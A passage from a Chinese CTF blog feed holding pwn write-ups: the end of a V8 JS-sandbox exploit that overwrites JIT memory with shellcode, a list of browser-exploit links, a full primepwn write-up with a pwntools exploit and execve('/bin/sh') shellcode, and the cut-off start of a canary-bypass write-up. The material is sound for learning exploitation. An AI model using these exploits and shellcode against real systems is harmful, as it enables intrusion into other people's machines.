src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-185130.png" alt=""></li><li>通过重写kBackingStoreOffset的值，您可以读取和写入任意地址，因此在利用时可以将其作为RW原语的函数来实现。<br>另外，关于i2_to_d()的描述被省略了，它是一个函数，可以使用ArrayBuffer将Uint32转换为double。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-185551.png" alt=""></li></ul></li></ol><h3 id="Identify-function-object"><a href="#Identify-function-object" class="headerlink" title="Identify function object"></a>Identify function object</h3><ol><li><p>ArrayBuffer后面跟着FixedArray 3，它有一个适当的函数对象作为元素<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-185739.png" alt=""><br>选择7作为特征值没有特别的意义。 只要选择你喜欢的长度，然后尝试。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-185837.png" alt=""></p></li><li><p>从FixedDoubleArray 2中，使用漏洞探索FixedArray 3的Element的偏移量，获取函数f的对象地址。</p><ul><li>如果一个值连续出现kLengthOffset次（如图中是7），则可以推断出它可能是包含函数f的对象地址的元素的偏移量。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-190158.png" alt=""></li></ul></li></ol><h3 id="在JIT区域嵌入shellcode"><a href="#在JIT区域嵌入shellcode" class="headerlink" title="在JIT区域嵌入shellcode"></a>在JIT区域嵌入shellcode</h3><ol><li>通过将函数f的对象地址放入kBackingStoreOffset并读取第七个元素，获取kCodeEntryOffset中的JIT地址<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-190809.png" alt=""></li><li>将该地址放在kBackingStoreOffset中，用shellcode覆盖JIT区域，然后调用函数f（）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-190858.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-191057.png" alt=""></li></ol><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ul><li>I am rewriting a part of the author’s write-up<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-191201.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-191534.png" alt=""></li><li>Execute exploit code with V8 sample-shell<ul><li>你可以确认/bin/sh启动<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-191712.png" alt=""></li><li>虽然以上是针对自建shell执行的，即使对distributed shell执行了exploit代码，也应该启动/bin/sh</li><li>Then replace it with the shellcode to be backconnected, then try exploit to the production is OK</li></ul></li><li>除了本文中讨论的解决方案之外，PPP还使用GC实现了另外一种writeup<ul><li><a href="https://rzhou.org/~ricky/pctf2016/js_sandbox.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/pctf2016/js_sandbox.js</a></li><li>但是，从range伪造，到进行数组的OOB-RW的思路是相同的</li></ul></li></ul><h1 id="Bonus-Other-JavaScript-issues-and-links"><a href="#Bonus-Other-JavaScript-issues-and-links" class="headerlink" title="Bonus Other JavaScript issues and links"></a>Bonus Other JavaScript issues and links</h1><h2 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h2><ul><li>[SECUINSIDE 2014] Yet another Javascript jail - 300<br><a href="https://gist.github.com/anonymous/b2340ac8429f4c5d186c" target="_blank" rel="noopener">https://gist.github.com/anonymous/b2340ac8429f4c5d186c</a><br><a href="http://ddaa.logdown.com/posts/203080-secuinside-2014-pwn-300-yet-another-javascript-jail" target="_blank" rel="noopener">http://ddaa.logdown.com/posts/203080-secuinside-2014-pwn-300-yet-another-javascript-jail</a><br><a href="https://gist.github.com/potetisensei/9a41a1848da4021c29e5" target="_blank" rel="noopener">https://gist.github.com/potetisensei/9a41a1848da4021c29e5</a></li><li>[34c3 CTF 2017] v9<br><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a><br><a href="https://gist.github.com/itsZN/9ae6417129c6658130a898cdaba8d76c" target="_blank" rel="noopener">https://gist.github.com/itsZN/9ae6417129c6658130a898cdaba8d76c</a></li></ul><h2 id="SpiderMonkey"><a href="#SpiderMonkey" class="headerlink" title="SpiderMonkey"></a>SpiderMonkey</h2><ul><li>[33c3 CTF 2016] pwn600 -feuerfuchs<br><a href="https://github.com/saelo/feuerfuchs" target="_blank" rel="noopener">https://github.com/saelo/feuerfuchs</a><br><a href="https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" target="_blank" rel="noopener">https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/</a></li><li>[CodeGate 2017] JS World -pwnable500<br><a href="https://gist.github.com/akiym/966b3d24146edb685b8a08edee551de2" target="_blank" rel="noopener">https://gist.github.com/akiym/966b3d24146edb685b8a08edee551de2</a></li></ul><h2 id="Chakra"><a href="#Chakra" class="headerlink" title="Chakra"></a>Chakra</h2><ul><li>[PlaidCTF 2017] Chakrazy -Pwnable600<br><a href="https://lokalhost.pl/ctf/pcft2017_chakra.js" target="_blank" rel="noopener">https://lokalhost.pl/ctf/pcft2017_chakra.js</a><br><a href="https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" target="_blank" rel="noopener">https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/</a><br><a href="https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba" target="_blank" rel="noopener">https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba</a></li></ul><h2 id="WebKit-JSC"><a href="#WebKit-JSC" class="headerlink" title="WebKit-JSC"></a>WebKit-JSC</h2><ul><li>[BkP CTF 2016] qwn2own -pwn10<br><a href="https://github.com/kitctf/writeups/blob/master/bkp2016/qwn2own/index.html" target="_blank" rel="noopener">https://github.com/kitctf/writeups/blob/master/bkp2016/qwn2own/index.html</a><br><a href="https://rzhou.org/~ricky/bkpctf2016/qwn2own/test.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/bkpctf2016/qwn2own/test.js</a><br><a href="http://vulph.com/2016/03/05/Boston-Key-Party-writeups.html" target="_blank" rel="noopener">http://vulph.com/2016/03/05/Boston-Key-Party-writeups.html</a><br><a href="https://github.com/acama/ctf/tree/master/bkpctf2016/qwn2own" target="_blank" rel="noopener">https://github.com/acama/ctf/tree/master/bkpctf2016/qwn2own</a><br><a href="http://lokalhost.pl/ctf/bkp2016/" target="_blank" rel="noopener">http://lokalhost.pl/ctf/bkp2016/</a><br><a href="http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16" target="_blank" rel="noopener">http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16</a></li></ul><h2 id="v8-exploit-study"><a href="#v8-exploit-study" class="headerlink" title="v8 exploit study"></a>v8 exploit study</h2><ul><li><a href="https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf" target="_blank" rel="noopener">https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf</a></li><li><p><a href="https://github.com/secmob/pwnfest2016/" target="_blank" rel="noopener">https://github.com/secmob/pwnfest2016/</a></p></li><li><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></p></li><li><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></li><li><a href="http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/" target="_blank" rel="noopener">http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/</a></li><li><a href="https://github.com/secmob/BadKernel" target="_blank" rel="noopener">https://github.com/secmob/BadKernel</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=386988" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=386988</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=416449" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=416449</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=468933" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=468933</a> (pwn2own 2015)</li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=595834" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=595834</a> (pwn2own 2016)</li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659474" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659474</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=776677</a></li><li><a href="https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/" target="_blank" rel="noopener">https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/</a></li><li><a href="https://www.it-sec-catalog.info/browser_exploitation.html" target="_blank" rel="noopener">https://www.it-sec-catalog.info/browser_exploitation.html</a></li><li><a href="https://arthurgerkis.gitbooks.io/it-sec-catalog/content/browser_exploitation.html" target="_blank" rel="noopener">https://arthurgerkis.gitbooks.io/it-sec-catalog/content/browser_exploitation.html</a></li><li><a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">https://github.com/tunz/js-vuln-db</a></li></ul><h2 id="SpiderMonkey-exploit-study"><a href="#SpiderMonkey-exploit-study" class="headerlink" title="SpiderMonkey exploit study"></a>SpiderMonkey exploit study</h2><ul><li><a href="http://www.geeknik.net/6zawqzuuu" target="_blank" rel="noopener">http://www.geeknik.net/6zawqzuuu</a></li><li><a href="https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak" target="_blank" rel="noopener">https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak</a></li><li><a href="https://grehack.fr/data/2017/slides/GreHack17_Get_the_Spidermonkey_off_your_back.pdf" target="_blank" rel="noopener">https://grehack.fr/data/2017/slides/GreHack17_Get_the_Spidermonkey_off_your_back.pdf</a></li><li><a href="https://github.com/rh0dev/slides/blob/master/OffensiveCon2018_From_Assembly_to_JavaScript_and_back.pdf" target="_blank" rel="noopener">https://github.com/rh0dev/slides/blob/master/OffensiveCon2018_From_Assembly_to_JavaScript_and_back.pdf</a></li></ul><h2 id="WebKit-JSC-exploit-study"><a href="#WebKit-JSC-exploit-study" class="headerlink" title="WebKit-JSC exploit study"></a>WebKit-JSC exploit study</h2><ul><li><a href="https://cansecwest.com/slides/2015/Liang_CanSecWest2015.pdf" target="_blank" rel="noopener">https://cansecwest.com/slides/2015/Liang_CanSecWest2015.pdf</a></li><li><a href="http://www.powerofcommunity.net/poc2016/keen.pdf" target="_blank" rel="noopener">http://www.powerofcommunity.net/poc2016/keen.pdf</a></li><li><a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://www.phrack.org/papers/attacking_javascript_engines.html</a></li><li><a href="https://scarybeastsecurity.blogspot.jp/2017/05/ode-to-use-after-free-one-vulnerable.html" target="_blank" rel="noopener">https://scarybeastsecurity.blogspot.jp/2017/05/ode-to-use-after-free-one-vulnerable.html</a></li><li><a href="https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc" target="_blank" rel="noopener">https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc</a></li><li><a href="https://phoenhex.re/2017-07-06/pwn2own-sandbox-escape" target="_blank" rel="noopener">https://phoenhex.re/2017-07-06/pwn2own-sandbox-escape</a></li></ul>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF中利用syscall写shellcode及*ctf primepwn writeup</title>
      <link href="/2018/04/27/star_primepwn/"/>
      <url>/2018/04/27/star_primepwn/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。</p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn</a><br><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">    .ascii &quot;Hello, world!\n&quot;</span><br><span class="line">    len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">    .global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq  $1, %rax</span><br><span class="line">    movq  $1, %rdi</span><br><span class="line">    movq  $msg, %rsi</span><br><span class="line">    movq  $len, %rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    movq  $60, %rax</span><br><span class="line">    xorq  %rdi, %rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></p><p>输出结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./test</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure></p><p>实际上这里是直接使用了write的syscall，它的系统调用号是1.<br>其他的syscall的系统调用号可以在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">系统调用表</a>查看。<br>我们可以看到我们在示例程序里用到的，1是write，60是exit退出程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1commonwritesys_write</span><br><span class="line">60commonexitsys_exit</span><br></pre></td></tr></table></figure></p><p>对于64位程序，通过syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p><h3 id="syscall的trick"><a href="#syscall的trick" class="headerlink" title="syscall的trick"></a>syscall的trick</h3><p>syscall在所有寄存器都为0的情况下，执行的时候会把rip赋值给rcx。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-050803.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-050747.png" alt=""><br>首先输入一个unsigned long也就是8字节的数据，然后判定输入的数据(写到0x601038)是不是素数，如果不是素数，程序就结束掉，如果是素数，那么继续运行。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-051405.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-051440.png" alt=""><br>可以看到0x601030存放的是指向0x601038的指针。<br>之后程序会把寄存器都清零，然后跳到0x601030指向的空间执行，也就是跳到0x601038，执行我们写入的数据。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>为了方便读者自己调试分析，我就走一遍exp，然后描述一下利用过程。<br>exp如下，我加了一行gdb.attach用来调试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pwn_file=<span class="string">"./primepwn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    conn=process(pwn_file)</span><br><span class="line">    pid=conn.pid</span><br><span class="line">    gdb.attach(conn) <span class="comment"># 用作调试</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conn=remote(<span class="string">"47.89.18.224"</span>,<span class="number">10008</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(prefix,s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=<span class="number">4</span>)</span><br><span class="line">    data=conn.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">    prefix,s=parse(<span class="string">"sha256(xxxx+&#123;&#125;) == &#123;&#125;"</span>,data)</span><br><span class="line">    conn.sendline(brute_force(prefix,s))</span><br><span class="line">    pid=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    log.debug(<span class="string">"process pid:%d"</span>%pid)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>,len(s),<span class="number">4</span>):</span><br><span class="line">        last=u32(s[i<span class="number">-4</span>:i])</span><br><span class="line">        now=u32(s[i:i+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> last &gt; now:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    mov esi,ecx</span></span><br><span class="line"><span class="string">    jmp start</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload=asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line">conn.sendline(str(u64(payload)))</span><br><span class="line">log.debug(<span class="string">"sleep 20s"</span>)</span><br><span class="line">sleep(<span class="number">20</span>)</span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">    mov rsp,rcx</span></span><br><span class="line"><span class="string">    add rsp,0x100</span></span><br><span class="line"><span class="string">    mov rax,0x3b</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    call get_shell</span></span><br><span class="line"><span class="string">    .ascii "/bin/sh"</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">get_shell:</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">conn.send(asm(code,arch=<span class="string">"amd64"</span>))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure></p><p>然后我们开始调试，如果你使用pwndbg插件，看到的应该和我一样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173228.png" alt=""><br>这样我们就断在了main函数执行之前，我们的目的是进入main函数单步看exp执行.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173323.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173521.png" alt=""><br>所以我们按5次finish（finsh的作用是执行到当前函数结束返回）<br>现在你应该看到下面这样：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173438.png" alt=""><br>然后单步n，一直单步到main函数最后的jmp。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173715.png" alt=""></p><p>由程序分析可知，首先我们要准备一个是素数的shellcode,且不能超过8个字节。<br>利用我们之前提到的syscall trick就可以做到，后面会分析为什么。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-071108.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">    syscall</span><br><span class="line">    dec edx</span><br><span class="line">    mov esi,ecx</span><br><span class="line">    jmp start</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A57 loc_400A57:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:0000000000400A57                 xor     rax, rax</span><br><span class="line">.text:0000000000400A5A                 xor     rbx, rbx</span><br><span class="line">.text:0000000000400A5D                 xor     rcx, rcx</span><br><span class="line">.text:0000000000400A60                 xor     rdx, rdx</span><br><span class="line">.text:0000000000400A63                 xor     rsi, rsi</span><br><span class="line">.text:0000000000400A66                 xor     rdi, rdi</span><br><span class="line">.text:0000000000400A69                 xor     rsp, rsp</span><br><span class="line">.text:0000000000400A6C                 xor     rbp, rbp</span><br><span class="line">.text:0000000000400A6F                 xor     r8, r8</span><br><span class="line">.text:0000000000400A72                 xor     r9, r9</span><br><span class="line">.text:0000000000400A75                 xor     r10, r10</span><br><span class="line">.text:0000000000400A78                 xor     r11, r11</span><br><span class="line">.text:0000000000400A7B                 xor     r12, r12</span><br><span class="line">.text:0000000000400A7E                 xor     r13, r13</span><br><span class="line">.text:0000000000400A81                 xor     r14, r14</span><br><span class="line">.text:0000000000400A84                 xor     r15, r15</span><br><span class="line">.text:0000000000400A87                 jmp     cs:qword_601030</span><br></pre></td></tr></table></figure><p>由于在这里我们通过xor把寄存器都清空了，所以在执行syscall的时候，把rip的值赋给了rcx。<br>syscall执行前<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173831.png" alt=""><br>syscall执行后<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173907.png" alt=""><br>然后传递参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dec edx</span><br><span class="line">mov esi,ecx</span><br></pre></td></tr></table></figure></p><p>edx从0减去1就是-1，即0xFFFFFFFF。<br>esi=ecx=rip。<br>rdi和eax在之前就已经被清零了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-173943.png" alt=""><br>jmp跳到syscall执行，相当于调用sys_read(0,rip,0xFFFFFFFF)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174015.png" alt=""><br>sys_read执行结束后，0x60103a(即rip，也就是下一条要执行的命令)及其之后的指令被覆盖,如下图可以看到我们将继续执行真正的shellcode。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174142.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-071417.jpg" alt=""><br>将真正的shellcode读入到rip中，这样，继续执行就执行到了我们的shellcode。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code=&quot;&quot;&quot;</span><br><span class="line">    mov rsp,rcx</span><br><span class="line">    add rsp,0x100---&gt;这句可以删掉</span><br><span class="line">    mov rax,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    call get_shell</span><br><span class="line">    .ascii &quot;/bin/sh&quot;</span><br><span class="line">    .byte 0</span><br><span class="line">get_shell:</span><br><span class="line">    pop rdi</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></p><p>因为之前rsp被置0了，所以为了在栈上保存/bin/sh，用在后面pop rdi。<br>现在要让rsp指向一个可写的地址，于是把rcx赋值给它。<br>然后将execve的系统调用号赋值给rax。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3bexecvesys_execve/ptregs</span><br></pre></td></tr></table></figure></p><p>传递参数，执行execve(‘/bin/sh’,0,0)来getshell<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174412.png" alt=""><br>注意在call的时候，会先把返回地址压栈，而返回地址就是下一条指令，也就是0x601056。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174616.png" alt=""><br>gdb里si跟入call的函数。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174717.png" alt=""><br>然后pop rdi就把参数传进去了，接着syscall就执行了execve(‘/bin/sh’,0,0)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174823.png" alt=""><br>getshell<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-27-174852.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>thread stack bypass canary和sixstar ctf babystack writeup</title>
      <link href="/2018/04/24/starctf_babystack/"/>
      <url>/2018/04/24/starctf_babystack/</url>
      <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a><br><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack</a><br>sixstar是真的良心，连赛题源码都放出了，十分适合学习。</p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="TLS和thread-stack"><a href="#TLS和thread-stack" class="headerlink" title="TLS和thread stack"></a>TLS和thread stack</h3><p>用到的技术来源于<a href="http://www.openwall.com/lists/oss-security/2018/02/27/5" target="_blank" rel="noopener">New bypass and protection techniques for ASLR on Linux</a><br>这篇文章，我把其中重点的部分按照我的理解翻译了一下，如果有问题请指正~</p><p>线程局部存储（Thread Local 